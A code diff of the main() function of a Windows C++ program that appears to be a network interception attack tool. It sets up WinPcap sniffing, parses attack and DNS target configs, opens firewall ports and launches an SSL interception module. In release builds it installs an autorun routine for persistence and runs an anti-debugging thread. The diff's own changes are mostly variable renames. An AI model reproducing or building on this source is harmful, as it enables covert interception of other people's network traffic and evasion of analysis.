@@ -23,7 +23,7 @@
 #include "Packet.h"
 #include "snifferpacket.h"
 #include "NetworkDevice.h"
-#include "Confiig.h"
+#include "Config.h"
 #include "safeGuard.h"
 #include "attack.h"
 #include "ssl\\sslentry.h"
@@ -104,7 +104,7 @@ int main(int argc, char** argv)
 
 	string username = "";
 	string password = "";
-	int netcard_target = -1;
+	int netcardNum = -1;
 	int isattack = 0;
 	int isimport = 0;
 	int isalldns = 0;
@@ -128,7 +128,7 @@ int main(int argc, char** argv)
 			serverIP = HttpUtils::ipatoi(server.c_str());
 		}
 		else if (lstrcmpiA(argv[num], "--n") == 0) {
-			netcard_target = atoi(argv[num+1]);
+			netcardNum = atoi(argv[num+1]);
 		}
 		else if (lstrcmpiA(argv[num], "-attack") == 0) {
 			isattack = 1;
@@ -163,12 +163,12 @@ int main(int argc, char** argv)
 	string path = Public::getpath();
 	SetCurrentDirectoryA(path.c_str());
 
-	int winpcapDelay = 1;
-	int opensslctrl_old = 0;
+	int winpcap = 1;
+	int opensslctl = 0;
 	
 	char gwmac[64] = { 0 };
 
-	vector<string> hostlist = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay,&opensslctrl_old, &gAttackMode, gwmac, server);
+	vector<string> hostlist = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcap,&opensslctl, &gAttackMode, gwmac,server, netcardNum);
 	if (hostlist.size() == 0) {
 		//log("parse config file:%s error\r\n", CONFIG_FILENAME);
 		//return -1;
@@ -177,8 +177,6 @@ int main(int argc, char** argv)
 	int dnsItemCnt = Config::parseDnsCfg(DNS_FILENAME, hostlist);
 	printf("dns target total:%u\r\n", dnsItemCnt);
 
-	
-	
 	ret = SafeGuard::loginCheck(gAttackMode, username, password);
 	if (ret <= 0)
 	{
@@ -186,21 +184,21 @@ int main(int argc, char** argv)
 		exit(-1);
 	}
 	
-	string adaptername = NetworkDevice::ChooseNetcard(&gLocalIP, &gNetmask, &gRouterIP, gLocalMac, netcard_target,&gDnsServer);
+	string adaptername = NetworkDevice::ChooseNetcard(&gLocalIP, &gNetmask, &gRouterIP, gLocalMac, netcardNum, &gDnsServer);
 	if (adaptername == "")
 	{
 		log("Choose Netcard error\r\n");
 		return -1;
 	}
-
+	
 	if (isattack) {
 		gAttackToggle = 1;
 	}
-	int opensslctrl = 0;
-	opensslctrl |= (isalldns << 3);
-	opensslctrl |= (isattack << 2);
-	opensslctrl |= (isimport<<1);
-	opensslctrl |= OPENSSL_CLEAR_PATH;
+	int opensslcontrol = 0;
+	opensslcontrol |= (isalldns << 3);
+	opensslcontrol |= (isattack << 2);
+	opensslcontrol |= (isimport<<1);
+	opensslcontrol |= OPENSSL_CLEAR_PATH;
 
 	if (gAttackMode == ATTACK_TEST_MODE)
 	{
@@ -220,19 +218,19 @@ int main(int argc, char** argv)
 	}
 
 #ifndef _DEBUG
-	ret = Tools::autorun(username, password, netcard_target);
+	ret = Tools::autorun(username, password, netcardNum);
 	DWORD debugTd = 0;
 	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SafeGuard::antiDebug, 0,0, &debugTd));
 #endif
 
 	string devname = string(WINPCAP_NETCARD_NAME_PREFIX) + adaptername;
-	pcap_t* pcapt = Winpcap::init(devname, winpcapDelay, gNetmask);
+	pcap_t* pcapt = Winpcap::init(devname, winpcap, gNetmask);
 	if (pcapt == 0)
 	{
 		log("winpcap init error\r\n");
 		return -1;
 	}
-	printf("device:%s,mask:%08x,winpcap delay:%d\r\n", devname.c_str(), gNetmask, winpcapDelay);
+	printf("device:%s,mask:%08x,winpcap delay:%d\r\n", devname.c_str(), gNetmask, winpcap);
 	
 	// 标准去重模式,vector、set、map这些容器的end()取出来的值不是最后一个、end的前一个才是最后一个,prev(xxx.end())取出最后一个
 	sort(hostlist.begin(), hostlist.end());  // 先排序
@@ -279,7 +277,7 @@ int main(int argc, char** argv)
 		ret = Tools::addFirewallPort(SSL_PORT, "SSL", "TCP");
 		ret = Tools::addFirewallPort(INFORMER_PORT, "INFORMER", "TCP");
 
-		ret = SSLEntry::SslEntry(serverIP, gLocalIP, path, opensslctrl, hostlist, targetlist);
+		ret = SSLEntry::SslEntry(serverIP, gLocalIP, path, opensslcontrol, hostlist, targetlist);
 
 		ret = Tools::setNetworkParams();
 
